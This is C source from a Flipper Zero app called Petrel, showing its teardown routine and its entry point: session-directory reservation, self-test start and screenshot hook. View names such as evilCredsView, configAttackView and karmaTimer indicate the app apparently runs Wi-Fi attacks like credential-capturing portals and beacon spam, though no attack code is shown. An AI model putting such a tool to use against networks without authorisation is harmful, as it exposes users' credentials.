static void app_free(Petrel* app) {
    FURI_LOG_D(TAG, __func__);
    furi_assert(app);

    furi_timer_stop(app->timer);
    furi_timer_stop(app->busyTimer);
    furi_timer_stop(app->karmaTimer);
    furi_timer_stop(app->scriptTimer);
    furi_timer_free(app->timer);
    furi_timer_free(app->busyTimer);
    furi_timer_free(app->karmaTimer);
    furi_timer_free(app->scriptTimer);
    uart_helper_free(app->uart_helper);
    // Now the queue can go - and it MUST, or every app run leaks the 64-slot ring plus every
    // FuriString still parked in it. The old comment here claimed the opposite; checked against the
    // firmware source, view_dispatcher_free() does NOT drain events or run the tick - it removes
    // the view port, frees its own input/event queues and the dispatcher. The tick is armed once
    // inside view_dispatcher_run() and stops firing when the loop returns, which is before app_free
    // is reached, and uart_helper_free() above has already joined the only producer. So detach the
    // tick anyway (cheap, makes the intent explicit), drop what is inside, then free the queue.
    view_dispatcher_set_tick_event_callback(app->view_dispatcher, NULL, 0);
    FuriString* leftover;
    while(furi_message_queue_get(app->uart_lines, &leftover, 0) == FuriStatusOk) {
        furi_string_free(leftover);
    }
    furi_message_queue_free(app->uart_lines);
    // Last, now that every producer is gone (all timers stopped above, the UART worker joined in
    // uart_helper_free, and the dispatcher's tick can no longer fire because its loop returned).
    // Stop the storage worker BEFORE anything else is torn down. Its queue is drained and freed
    // here rather than waited on: pending jobs are dropped, never awaited forever.
    // Let the worker finish what it already accepted (bounded): closing used to free queued
    // captures/reports without writing them or saying so.
    for(int i = 0; i < 500; i++) {
        furi_mutex_acquire(storage_mutex, FuriWaitForever);
        bool empty = (storage_tail == storage_head);
        furi_mutex_release(storage_mutex);
        if(empty) break;
        furi_delay_ms(10);
    }
    storage_run = false;
    if(storage_thread) {
        furi_thread_join(storage_thread);
        furi_thread_free(storage_thread);
        storage_thread = NULL;
    }
    // Producers are stopped (every timer above, the UART worker in uart_helper_free, the tick loop
    // has returned), so this is the last word: flush whatever is still in the ring, including the
    // self-test's completion record, instead of leaving it to be freed unseen.
    for(int i = 0; i < 50 && diag_flushed != diag_head; i++) diag_flush();   // drain the whole ring
    furi_mutex_acquire(storage_mutex, FuriWaitForever);
    while(storage_tail != storage_head) {
        free(storage_q[storage_tail].data);
        storage_tail = (uint8_t)((storage_tail + 1) % STORAGE_Q);
    }
    furi_mutex_release(storage_mutex);
    furi_mutex_free(storage_mutex);
    storage_mutex = NULL;
    furi_mutex_free(post_mutex);
    furi_mutex_free(diag_mutex);
    diag_mutex = NULL;
    post_mutex = NULL;

    view_dispatcher_remove_view(app->view_dispatcher, mainMenuView);
    view_dispatcher_remove_view(app->view_dispatcher, scannedWifisView);
    view_dispatcher_remove_view(app->view_dispatcher, bssidTextInputView);
    view_dispatcher_remove_view(app->view_dispatcher, loadingView);
    view_dispatcher_remove_view(app->view_dispatcher, wifiInfoView);
    view_dispatcher_remove_view(app->view_dispatcher, configAttackView);
    view_dispatcher_remove_view(app->view_dispatcher, evilCredsView);
    view_dispatcher_remove_view(app->view_dispatcher, aPmacAddresView);
    view_dispatcher_remove_view(app->view_dispatcher, beaconListView);
    view_dispatcher_remove_view(app->view_dispatcher, beaconInfoView);
    view_dispatcher_remove_view(app->view_dispatcher, configAPView);
    view_dispatcher_remove_view(app->view_dispatcher, helpView);
    view_dispatcher_remove_view(app->view_dispatcher, popupView);
    view_dispatcher_remove_view(app->view_dispatcher, apNameTextInputView);
    view_dispatcher_remove_view(app->view_dispatcher, apPasswordTextInputView);
    view_dispatcher_remove_view(app->view_dispatcher, cardMenuView);
    view_dispatcher_remove_view(app->view_dispatcher, pmfView);
    view_dispatcher_remove_view(app->view_dispatcher, toolsListView);
    view_dispatcher_remove_view(app->view_dispatcher, channelMapView);
    view_dispatcher_remove_view(app->view_dispatcher, busyView);
    view_dispatcher_remove_view(app->view_dispatcher, settingsView);

    scene_manager_free(app->scene_manager);

    view_dispatcher_free(app->view_dispatcher); //Some events whre not processed

    menu_free(app->menu);
    submenu_free(app->submenu);
    variable_item_list_free(app->variableList);
    byte_input_free(app->byteInput);
    widget_free(app->widget);
    view_free(app->cardView);
    view_free(app->chanMapView);
    view_free(app->busyView);
    text_input_free(app->text_input);
    loading_free(app->loading);
    app->wifiCount = 0;
    app->rickIndex = 0;

    free(app->ssidAP);
    free(app->passwordAP);
    furi_record_close(RECORD_GUI);
    furi_hal_power_disable_otg();
    free(app);
}

int32_t Petrel_app(void* p) {
    FURI_LOG_D(TAG, __func__);

    // Reserve the session before app_alloc starts storage/UART producers (D6-1, architect).
    // mkdir is the reservation: an existing directory is never reused, so two launches in the same
    // second (or a relaunch after a crash) can no longer write into one directory.
    {
        DateTime dt;
        furi_hal_rtc_get_datetime(&dt);
        char base[32];   // worst-case year: %04d can exceed 4 digits without truncating
        snprintf(
            base,
            sizeof(base),
            "%04d-%02d-%02d_%02d-%02d-%02d",
            dt.year,
            dt.month,
            dt.day,
            dt.hour,
            dt.minute,
            dt.second);

        Storage* st = furi_record_open(RECORD_STORAGE);
        FS_Error err = storage_common_mkdir(st, "/ext/petrel");
        bool ready = (err == FSE_OK || err == FSE_EXIST);
        if(ready) {
            err = storage_common_mkdir(st, "/ext/petrel/sessions");
            ready = (err == FSE_OK || err == FSE_EXIST);
        }

        bool reserved = false;
        if(ready) {
            for(unsigned suffix = 0; suffix < 1000; suffix++) {
                if(suffix == 0) {
                    snprintf(petrel_session_id, sizeof(petrel_session_id), "%s", base);
                } else {
                    snprintf(
                        petrel_session_id,
                        sizeof(petrel_session_id),
                        "%s_%03u",
                        base,
                        suffix);
                }
                char dir[96];
                snprintf(dir, sizeof(dir), "/ext/petrel/sessions/%s", petrel_session_id);
                err = storage_common_mkdir(st, dir);
                if(err == FSE_OK) {
                    reserved = true;
                    break;
                }
                if(err != FSE_EXIST) break;
            }
        }
        furi_record_close(RECORD_STORAGE);
        if(!reserved) {
            // No evidence directory means the run cannot be attributed later - fail BEFORE any
            // worker, UART traffic or board power-up, rather than overwrite someone else's.
            FURI_LOG_E(TAG, "Cannot reserve session directory");
            return -1;
        }
    }

    Petrel* app = app_alloc();
    petrel_settings_load();
    Expansion* expansion = furi_record_open(RECORD_EXPANSION);
    expansion_disable(expansion);
    if(!furi_hal_power_is_otg_enabled()) furi_hal_power_enable_otg();
    Gui* gui = furi_record_open(RECORD_GUI);
    // RPC'siz ekran goruntusu: her kare /ext/petrel/shot.hex'e yazilir (tools/flip_shot.py PNG'ye cevirir).
    gui_add_framebuffer_callback(gui, petrel_fb_callback, app);
    view_dispatcher_attach_to_gui(app->view_dispatcher, gui, ViewDispatcherTypeFullscreen);
    scene_manager_next_scene(app->scene_manager, mainMenuScene);
    // Deterministic diagnostic entry point (architect, D.5): start the self-test from the app
    // argument, so a traversal run needs no menu navigation at all - the Settings row could not be
    // reached reliably with injected keys. Exact match, so no other argument can start it. This
    // exercises the scene transitions; it does NOT test that the Settings row works.
    if(p && strcmp((const char*)p, "selftest") == 0) {
        st_lap = 0;
        st_step = 0;
        st_due = furi_get_tick();
        st_active = true;
        diag(7, 1u, (uint32_t)ST_LAPS);
    }
    view_dispatcher_run(app->view_dispatcher);
    gui_remove_framebuffer_callback(gui, petrel_fb_callback, app);

    app_free(app);
    expansion_enable(expansion);
    furi_record_close(RECORD_EXPANSION);

    return 0;
}
